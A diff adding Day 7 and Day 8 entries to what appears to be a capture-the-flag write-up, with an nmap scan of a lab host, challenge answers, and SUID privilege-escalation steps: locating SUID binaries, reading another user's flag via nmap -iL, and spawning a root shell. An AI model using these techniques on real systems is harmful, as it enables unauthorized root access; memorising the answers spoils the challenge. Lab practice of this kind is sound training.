@@ -130,3 +130,38 @@ Trainig
 
 
 ```
+
+***Day 7***
+```
+Skilling Up
+Command : nmap -A -sC -sV 10.10.205.160 -oN Day7Scaaning.txt
+#1 How many TCP ports number under 1000 are open?
+:3
+
+#2 What is the name of the OS of the host?
+:linux
+
+#3 What version of ssh is running?
+:7.4
+
+#4 what is the name of the file that is accessbile on the server you found running?
+:interesting.file
+```
+
+
+***Day 8***
+```
+SUID Shenanigans
+SUID Shenanigans
+#1 What port is ssh running on?
+: 65534
+
+#2 Find and run a file as igor, Read the file /home/igor/flag.txt
+: find / -perm -4000 -user igor 2>/dev/null
+: /usr/bin/nmap -iL /home/igor/flag1.txt
+
+#3 Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?
+: find / -perm -4000 -user root 2>/dev/null
+: each lines analysis
+: /usr/bin/system-contorl -> bash or /bin/bash!
+```
